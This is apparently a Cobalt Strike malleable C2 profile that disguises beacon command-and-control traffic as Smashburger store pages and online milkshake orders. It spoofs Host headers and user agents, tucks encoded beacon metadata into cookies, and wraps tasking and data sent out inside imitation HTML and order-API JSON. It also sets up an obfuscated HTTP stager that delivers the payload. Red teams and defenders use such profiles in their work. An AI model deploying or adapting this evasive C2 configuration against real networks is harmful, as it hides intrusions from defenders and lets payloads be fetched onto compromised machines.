#trevorforget
#smashburger - online order - milkshake anyone?
#xx0hcd

set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {
    
    set uri "/us/ky/louisville/312-s-fourth-st.html";
    
    client {

	header "Host" "locations.smashburger.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US,en;q=0.5";
	header "Referer" "https://locations.smashburger.com/us/ky/louisville.html";
	header "Connection" "close";
	
        
        metadata {
            base64url;
	    header "Cookie";

        }

    }

    server {

	header "Content-Type" "text/html; charset=utf-8";
	header "Etag" "\"57507b788e9ddc737aae615d6bcfc875\"";
	header "Server" "AmazonS3";
	header "Last-Modified" "on, 23 Oct 2017 20:50:49 GMT";
	header "Vary" "Accept-Encoding";
	header "X-Amz-Id-2" "1bGgvQSuG7u4T5qWKlikvJ//uxb9tKkDsbSDOV8YBxhKk64Ij3ygUMxZQ=";
	header "X-Amz-Request-Id" "AC1346376B07D";
	header "Connection" "close";
        

        output {

            base64url;

	    prepend "<!doctype html><html lang=\"en\" dir=\"ltr\" class=\"victoria\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"><link rel=\"dns-prefetch\" href=\"//www.yext-pixel.com\"><link rel=\"dns-prefetch\" href=\"//a.cdnmktg.com\"><link rel=\"dns-prefetch\" href=\"//a.mktgcdn.com\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"><meta name=\"format-detection\" content=\"telephone=no\"><link rel=\"shortcut icon\" href=\"../../../images/locations.smashburger.com/favicon.png\"><meta name=\"description\" content=\"Come in to Smashburger at 312 S Fourth St in Louisville, KY and visit our family-friendly restaurant for burgers, salads, chicken sandwiches, hand-spun shakes & kids meals.\"><meta name=\"keywords\" content=\"\"><meta property=\"og:title\" content=\"Smashburger in 312 S Fourth St Louisville, KY | burgers, sandwiches, shakes\"><meta property=\"og:description\" content=\"Come in to Smashburger at 312 S Fourth St in Louisville, KY and visit our family-friendly restaurant for burgers, salads, chicken sandwiches, hand-spun shakes & kids meals.\"><meta property=\"og:image\" content=\"../../../images/locations.smashburger.com/logo.png\"><meta property=\"og:type\" content=\"website\"><meta property=\"og:url\" content=\"../../../us/ky/louisville/312-s-fourth-st.html\"><link rel=\"canonical\" href=\"https://locations.smashburger.com/us/ky/louisville/312-s-fourth-st.html\" /><title>Smashburger in 312 S Fourth St Louisville, KY | burgers, sandwiches, shakes</title><script type=\"text/javascript\">ref=";

	    append "../../../us.html\"><span class=\"c-bread-crumbs-name\">US</span></a></li><li class=\"c-bread-crumbs-item\"><a href=\"../../../us/ky.html\"><span class=\"c-bread-crumbs-name\">KY</span></a></li><li class=\"c-bread-crumbs-item\"><a href=\"../../../us/ky/louisville.html\"><span class=\"c-bread-crumbs-name\">Louisville</span></a></li><li class=\"c-bread-crumbs-item\"><span class=\"c-bread-crumbs-name\">312 S Fourth St</span></li></ol></nav></div><div class=\"l-container\"><ul class=\"c-social-links\"><li class=\"c-social-links-item\"><a href=\"https://twitter.com/smashburger\" class=\"c-social-link c-social-link-twitter\"><span class=\"sr-only\">Visit us on Twitter</span><svg class=\"icon icon-twitter icon-social\" aria-hidden=\"true\"><use xlink:href=\"../../../images/icons.svg#twitter\" /></svg></a></li><li class=\"c-social-links-item\"><a href=\"https://www.facebook.com/smashburger\" class=\"c-social-link c-social-link-facebook\"><span class=\"sr-only\">Visit us on Facebook</span><svg class=\"icon icon-facebook icon-social\" aria-hidden=\"true\"><use xlink:href=\"../../../images/icons.svg#facebook\" /></svg></a></li><li class=\"c-social-links-item\"><a href=\"https://www.instagram.com/smashburger/\" class=\"c-social-link c-social-link-instagram\"><span class=\"sr-only\">Visit us on Instagram</span><svg class=\"icon icon-instagram icon-social\" aria-hidden=\"true\"><use xlink:href=\"../../../images/icons.svg#instagram\" /></svg></a></li></ul><p class=\"c-copy-date \">&copy;<span id=\"js-copy-date\">2017</span> Smashburger Master LLC.  All rights reserved.<script>(function(){var year = new Date().getFullYear(); document.getElementById('js-copy-date').innerText = year;})()</script>";
	

            print;
        }
    }
}

http-post {
    
    set uri "/OrderEntryService.asmx/AddOrderLine";

    client {

	header "Host" "smashburger.alohaorderonline.com";
	header "Accept" "*/*";    
	header "Accept-Language" "en-US,en;q=0.5";
	header "X-Requested-With" "XMLHttpRequest";
        
        output {
            base64url;
	    print;
	    


        }


        id {
            base64url;
	    header "Cookie";

        }

    }

    server {

	header "Cache-Control" "private, max-age=0";
	header "Content-Type" "application/json; charset=utf-8";
	header "Vary" "Accept-Encoding";
	header "Server" "Microsoft-IIS/7.5";
	header "X-AspNet-Version" "4.0.30319";
	header "X-Powered-By" "ASP.NET";
	header "X-UA-Compatible" "IE=Edge";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Connection" "close";
        
        
        output {
            netbios;
	    
	    prepend "{\"d\":{\"__type\":\"Radiant.Order.Web.Order.CodeFiles.OrderEntryResults.OrderEntryResult\",\"Success\":true,\"Message\":\"\",\"ResultCode\":0,\"Order\":{\"__type\":\"Radiant.Order.Shared.Contracts.ServiceEntities.Order\",\"SiteId\":190,\"OrderId\":20106,\"SubTotalAmount\":3.9900,\"TaxAmount\":0,\"TotalAmount\":3.9900,\"BalanceDueAmount\":3.9900,\"Status\":1,\"NextItemLineNumber\":2,\"SpecialInstructions\":null,\"LineItems\":[{\"ItemLineNumber\":1,\"SalesItemId\":41099,\"Name\":\"Strawberry Shake\",\"Quantity\":1,\"UnitPrice\":3.9900,\"ExtendedPrice\":3.9900,\"NextModifierSequenceNumber\":1,\"SpecialInstructions=";

	    append "&OrderingForCustomerId\":null,\"CheckoutCount\":0,\"VehicleMake\":null,\"VehicleModel\":null,\"VehicleColor\":null,\"OrderType\":1,\"OrderSource\":0,\"Destination\":0,\"ShouldManualRelease\":false,\"SVCAmount\":0,\"TipAmount\":0,\"LoyaltyCardNumber\":null,\"Recipients\":[],\"DeliveryFeeSetFromDeliveryZone\":false,\"PromoId\":0,\"DeliveryFeeTaxApplied\":false,\"PosStatus\":18,\"PosOrderId\":null,\"ReferenceNumber\":null,\"CalculateTaxAndTotalTime\":0,\"ClientSessionID\":\"jdyfu2yh5eqsbhs343phqlct\",\"AddOrderTime\":0,\"ComboItems\":[],\"OrderDiscounts\":[],\"WebSalesGroupLineIds\":[],\"WebSalesGroupLineItemNumbers\":[],\"RecomputedSubTotal\":3.9900,\"CanUpdateOrder\":0,\"Metadata\":{\"ClientPlatform\":null,\"ClientVersion\":null},\"AssignLoyalty\":true,\"Payments\":[],\"NextOrderOfProcessing\":1,\"SiteNotes\":null,\"DiscountTotal\":0,\"ExternalOrderId\":null,\"Comps\":null,\"AppliedComps\":null,\"LoyaltyRewards\":[],\"HasDiscount\":false,\"GetDiscount\":0},\"SessionExpired\":false,\"ItemNotFound\":false,\"ItemNotFoundMessage\":null}}";

            print;
        }
    }
}

http-stager {

    set uri_x86 "/menus.aspx";
    set uri_x64 "/Menus.aspx";


    client {

	header "Host" "smashburger.alohaorderonline.com";
        header "Accept" "*/*";
	header "Accept-Language" "en-US,en;q=0.5";
	header "Referer" "https://locations.smashburger.com/us/ky/louisville/312-s-fourth-st.html";
	header "Connection" "close";

    }

    server {
        header "Cache-Control" "private";
	header "Content-Type" "text/html; charset=utf-8";
	header "Location" "/Time.aspx";
	header "Server" "Microsoft-IIS/7.5";
	header "X-AspNet-Version" "4.0.30319";
	header "Set-Cookie" "OrderMode=1; path=/";
	header "X-Powered-By" "ASP.NET";
	header "X-UA-Compatible" "IE=Edge";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Connection" "close";

	output {
	    print;
	}
    
    }


}

stage {
	set userwx "false";
	set compile_time "03 Apr 2016 08:12:10";
	set image_size_x86 "420000";
	set image_size_x64 "420000";
	set obfuscate "true";
}
